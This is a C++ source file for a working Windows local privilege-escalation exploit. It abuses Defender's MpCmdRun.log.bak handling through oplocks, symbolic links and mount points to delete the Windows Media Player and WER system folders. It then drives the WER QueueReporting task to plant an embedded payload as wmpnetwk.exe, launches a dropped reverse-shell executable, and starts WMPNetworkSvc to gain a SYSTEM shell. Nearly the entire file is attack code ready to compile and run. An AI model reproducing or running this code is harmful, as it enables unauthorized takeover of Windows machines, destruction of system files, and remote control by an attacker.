#include "stdafx.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <iostream>
#include <conio.h>
#include <ctime>
#include <wchar.h>
#include <io.h>
#include <string.h>
#include <stdio.h>
#include <random>
#include <AclAPI.h>
#include "ntimports.h"
#include "CommonUtils.h"
#include "resource.h"

#pragma warning(disable : 4996) //silence some compiler warning
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;
HANDLE wer;
HANDLE lnk;
HANDLE lnk2;
HANDLE file;
HANDLE wmp;
HANDLE hdir;
string dir;
string filename;
HANDLE proc;
bool MoveByHandle(HANDLE hfile, const wchar_t* Renamed) {
	auto destFilenameLength = wcslen(Renamed);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _alloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, Renamed, destFilenameLength);
	if (!SetFileInformationByHandle(hfile, FileRenameInfo, fri, bufferSize))
	{
		return 0;
	}
	else
		return 1;
}
void remove_dir(const wchar_t* folder)
{
	std::wstring search_path = std::wstring(folder) + _T("/*.*");
	std::wstring s_p = std::wstring(folder) + _T("/");
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(fd.cFileName, _T(".")) != 0 && wcscmp(fd.cFileName, _T("..")) != 0)
				{
					remove_dir((wchar_t*)(s_p + fd.cFileName).c_str());
				}
			}
			else {
				DeleteFile((s_p + fd.cFileName).c_str());
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
		_wrmdir(folder);
	}
}
HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
	DEFINE_NTDLL(RtlInitUnicodeString);
	DEFINE_NTDLL(NtCreateSymbolicLinkObject);

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	fRtlInitUnicodeString(&name, linkname);
	fRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

	HANDLE hLink;

	NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
		SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		//DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
		return hLink;
	}
	else
	{
		SetLastError(NtStatusToDosError(status));
		return nullptr;
	}
}
BOOL makedir(string dir) {
	//this function will create a directory that allow everyone to have full access on it
	//due to the default ACL in c:\windows\temp which doesn't allow a standard user to have
	//a read access to the subcontent
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	PSID everyone_sid = NULL;
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &everyone_sid);
	EXPLICIT_ACCESS ea;
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;//full access to everyone
	ea.grfAccessMode = SET_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea.Trustee.ptstrName = (LPWSTR)everyone_sid;//everyone sid
	PACL acl = NULL;
	SetEntriesInAcl(1, &ea, NULL, &acl);
	PSECURITY_DESCRIPTOR sd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
		SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(sd, SECURITY_DESCRIPTOR_REVISION);
	SetSecurityDescriptorDacl(sd, TRUE, acl, FALSE);
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = sd;
	sa.bInheritHandle = FALSE;

	return CreateDirectoryA(dir.c_str(), &sa);

}
void WritePayload(HANDLE file) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_EXE1), L"exe");
	DWORD DllSize = SizeofResource(hm, res);
	void* dllBuff = LoadResource(hm, res);
	DWORD sizeout;
	WriteFile(file, dllBuff, DllSize, &sizeout, NULL);
	CloseHandle(file);
}
void WriteRv(HANDLE hfile) {
	HMODULE hm = GetModuleHandle(NULL);
	HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_EXE2), L"exe");
	DWORD DllSize = SizeofResource(hm, res);
	void* dllBuff = LoadResource(hm, res);
	DWORD sizeout;
	WriteFile(hfile, dllBuff, DllSize, &sizeout, NULL);
	CloseHandle(hfile);
}
void wercb() {
	//terminate the powershell worker process
	//am actually doing that cause this mean the mpcmdrun.log has been filed with 16.5mb data
	//this function only run if someone tried to access to the directory C:\\Windows\\Temp\\MpCmdRun.log.bak\\WER requesting DELETE access
	TerminateProcess(proc, ERROR_SUCCESS);
	/// move both directories wer and wmp in c:\windows\temp\asm*.tmp
	/// it's needed in order to wipe C:\\Windows\\Temp\\MpCmdRun.log.bak
	/// in order to set a reparse point
	wchar_t pp[MAX_PATH];
	GetTempFileName(L"C:\\Windows\\Temp", L"asm", NULL, pp);
	printf("[+] OpLock Triggered !\n");
	wprintf(L"[!] Moving C:\\Windows\\Temp\\MpCmdRun.log.bak\\WER To %s ... ", pp);
	if (!MoveByHandle(wer, pp)) {
		printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done\n");
	wchar_t pp2[MAX_PATH];
	GetTempFileName(L"C:\\Windows\\Temp", L"asm", NULL, pp2);
	wprintf(L"[!] Moving C:\\Windows\\Temp\\MpCmdRun.log.bak\\wmp To %s ... ", pp2);
	if (!MoveByHandle(wmp, pp2)) {
	    printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done\n");
	printf("[!] Attempting To Create Symbolic Link in \\RPC CONTROL\\WER <==> \\??\\C:\\ProgramData\\Microsoft\\Windows\\WER ... ");
	lnk = CreateSymlink(NULL, L"\\RPC CONTROL\\WER", L"\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER");
	if (lnk == INVALID_HANDLE_VALUE) {
		printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done !\n");
	printf("[!] Attempting To Create Symbolic Link in \\RPC CONTROL\\wmp <==> \\??\\C:\\Program Files\\Windows Media Player ... ");
	lnk2 = CreateSymlink(NULL, L"\\RPC CONTROL\\wmp", L"\\??\\C:\\Program Files\\Windows Media Player");
	if (lnk2 == INVALID_HANDLE_VALUE) {
		printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done !\n");
	printf("[!] Setting Up Mount Point From C:\\Windows\\Temp\\MpCmdRun.log.bak To \\RPC CONTROL\\ ... ");
	hdir = CreateFileA("C:\\Windows\\Temp\\MpCmdRun.log.bak", GENERIC_WRITE,
		FULL_SHARING
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (!ReparsePoint::CreateMountPoint(hdir, L"\\RPC CONTROL\\", L"")) {
		printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done !\n");

}
void WaitServiceToExit() {
	SC_HANDLE svc = OpenService(OpenSCManager(NULL, NULL, GENERIC_READ), L"WMPNetworkSvc", SERVICE_QUERY_STATUS);
	SERVICE_STATUS status;
	QueryServiceStatus(svc, &status);
	bool once = true;
	while (status.dwCurrentState != SERVICE_STOPPED) {
		if (once) {
			once = false;
			cout << "[-] The Service : \"Windows Media Player Network Sharing Service\" Is Running Waiting It To Stop" << endl;
		}
		Sleep(500);//to avoid huge cpu usage
		QueryServiceStatus(svc, &status);
	}
}

int main(int argc, char* argv[]) {

	WaitServiceToExit();
	//just to make sure
	remove_dir(L"C:\\Windows\\Temp\\MpCmdRun.log.bak");
	DeleteFile(L"C:\\Windows\\Temp\\MpCmdRun.log.bak");
	printf("[+] Creating Directory C:\\Windows\\Temp\\MpCmdRun.log.bak ... ");

	makedir("C:\\Windows\\Temp\\MpCmdRun.log.bak");

	printf("Done !\n");
	printf("[+] Creating Directory C:\\Windows\\Temp\\MpCmdRun.log.bak\\wmp ... ");
	makedir("C:\\Windows\\Temp\\MpCmdRun.log.bak\\wmp");

	printf("Done !\n");
	makedir("C:\\Windows\\Temp\\MpCmdRun.log.bak\\WER");

	printf("Done !\n");

	wer = CreateFileA("C:\\Windows\\Temp\\MpCmdRun.log.bak\\WER",GENERIC_READ|DELETE,
		NULL//no sharing
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	wmp = CreateFileA("C:\\Windows\\Temp\\MpCmdRun.log.bak\\wmp", GENERIC_READ | DELETE,
		NULL
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	
	printf("[+] Locking C:\\Windows\\Temp\\MpCmdRun.log.bak\\WER And C:\\Windows\\Temp\\MpCmdRun.log.bak\\wmp ...");
	FileOpLock* lock = FileOpLock::CreateLock(wer, wercb);
	if (lock != nullptr) {
		printf(" Done ! \n[!] Waiting OpLock To Trigger ...\n");
		/// run the worker thread which will file c:\windows\temp\mpcmdrun.log with
		/// 16mb data in order to trigger the vulnerability
		/// so here we go
		PROCESS_INFORMATION pi = { 0 };
		STARTUPINFO si = { 0 };
		CreateProcess(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			L"-c measure-command -expression { for ($i=0; $i -lt 100000; $i++) { update-mpsignature -updatesource internaldefinitionupdateserver -erroraction silentlycontinue } }",
			0, 0, 0, 0, 0, 0, &si, &pi);
		proc = pi.hProcess;
		lock->WaitForLock(INFINITE);
	}
	//wait sometime until the windefend end the files deletion
	//you might need to expand this if there's to much files in C:\\ProgramData\\Microsoft\\Windows\\WER
	Sleep(10000);
	//close thos freaking handles
	CloseHandle(lnk);
	CloseHandle(lnk2);
	// test if the file deletion succed or no 
	HANDLE test = CreateFileA("C:\\Program Files\\Windows Media Player", NULL,
		FULL_SHARING
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (test != INVALID_HANDLE_VALUE) {
		//error
		printf("[-] Something Went Wrong The Directory \"C:\\Program Files\\Windows Media Player\" Still Exist :(");
		return 1;
	}
	printf("[+] Success - The Directory \"C:\\Program Files\\Windows Media Player\" Has Been Deleted :)\n");
	test = CreateFileA("C:\\ProgramData\\Microsoft\\Windows\\WER", NULL,
		FULL_SHARING
		, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE | FILE_FLAG_OVERLAPPED | FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (test != INVALID_HANDLE_VALUE) {
		//error
		printf("[-] Something Went Wrong The Directory \"C:\\ProgramData\\Microsoft\\Windows\\WER\" Still Exist :(");
		return 1;
	}
	//if it succed we need to move forward
	//phase 2: going for SYSTEM
	printf("[!] Attemting To Stop Scheduled Task QueueReporting If Running ...\n");
	system("schtasks /end /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	printf("[!] Attemting To Run Scheduled Task QueueReporting ...\n");
	system("schtasks /run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	//wait until the windows error reporting tool end directory creation
	Sleep(2000);
	printf("[!] Attemting To Stop Scheduled Task QueueReporting If Running ...\n");
	system("schtasks /end /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	//check if we have write access to it
	HANDLE werdir = CreateFile(L"C:\\ProgramData\\Microsoft\\Windows\\WER", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	if (werdir == INVALID_HANDLE_VALUE) {
		printf("[-] Error The Directory C:\\ProgramData\\Microsoft\\Windows\\WER Either Doesn't Exist Or Not Write-able :(");
		return 1;
	}
	printf("[+] The Directory C:\\ProgramData\\Microsoft\\Windows\\WER Has Been Created !\n");
	printf("[!] Attempting To Wipe SubContent\n");

	//wipe anything that can be created from the wer in order to set a mount point
	remove_dir(L"C:\\ProgramData\\Microsoft\\Windows\\WER");
	//set mount point to redirect C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp creation to windows media player folder
	printf("[!] Attempting To Reparse C:\\ProgramData\\Microsoft\\Windows\\WER To \\RPC CONTROL\\ ... ");
	if (!ReparsePoint::CreateMountPoint(werdir, L"\\RPC CONTROL\\", L"")) {
		printf("\n[-] Error : %d", GetLastError());
		return 1;
	}
	printf("Done !\n");
	printf("[!] Attempting To Create Symbolic Link in \\RPC CONTROL\\Temp <==> \\??\\C:\\Program Files\\Windows Media Player ... ");
	lnk = CreateSymlink(NULL, L"\\RPC CONTROL\\Temp", L"\\??\\C:\\Program Files\\Windows Media Player");
	if (lnk == INVALID_HANDLE_VALUE) {
		printf("\n[-] Error : %d", GetLastError());
		ExitProcess(EXIT_FAILURE);
	}
	printf("Done !\n");
	//trigger the arbitrary dir creation
	printf("[!] Attemting To Run Scheduled Task QueueReporting ...\n");
	system("schtasks /run /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	Sleep(5000);
	printf("[!] Attemting To Stop Scheduled Task QueueReporting If Running ...\n");
	system("schtasks /end /TN \"\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
	HANDLE exe = CreateFile(L"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe", GENERIC_WRITE | WRITE_DAC | READ_CONTROL, FULL_SHARING, 0, CREATE_ALWAYS, 0, NULL);
	if (exe == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Create File \"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\" , Error: %d", GetLastError());
		return 1;
	}
	printf("[+] File \"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\" Created !\n");
	//setup a null dacl to make sure that "nt authority\network service has the execute permission on the file
	SetSecurityInfo(exe, SE_FILE_OBJECT, PROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	//write a reverse shell payload
	WritePayload(exe);

	printf("[+] Successfully Writen Payload Service !\n");
	HANDLE exe2 = CreateFile(L"C:\\Windows\\Temp\\asmae.exe", GENERIC_WRITE | WRITE_DAC | READ_CONTROL, FULL_SHARING, 0, CREATE_ALWAYS, 0, NULL);
	if (exe == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Create File \"C:\\Program Files\\Windows Media Player\\wmpnetwk.exe\" , Error: %d", GetLastError());
		return 1;
	}
	printf("[+] File \"C:\\Windows\\Temp\\asmae.exe\" Created !\n");
	SetSecurityInfo(exe2, SE_FILE_OBJECT, PROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);
	WriteRv(exe2);
	printf("[+] Successfully Writen Reverse Shell !\n");
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateProcessW(L"C:\\Windows\\Temp\\asmae.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
		printf("[-] Failed To Run The Executable C:\\Windows\\Temp\\asmae.exe :(");
		return 1;
	}
	printf("[+] Sucessfully Spawned Shell !\n");
	//friendly nuke is ready
	SC_HANDLE svc = OpenService(OpenSCManager(NULL, NULL, GENERIC_READ), L"WMPNetworkSvc", SERVICE_START);
	if (StartService(svc, NULL, NULL) == 0) {
		printf("[-] Failed To Run WMPNetworkSvc Error: %d", GetLastError());
		return 1;
	}
	//now everything worked fine the shell should be connected to the system one
	return 0;
}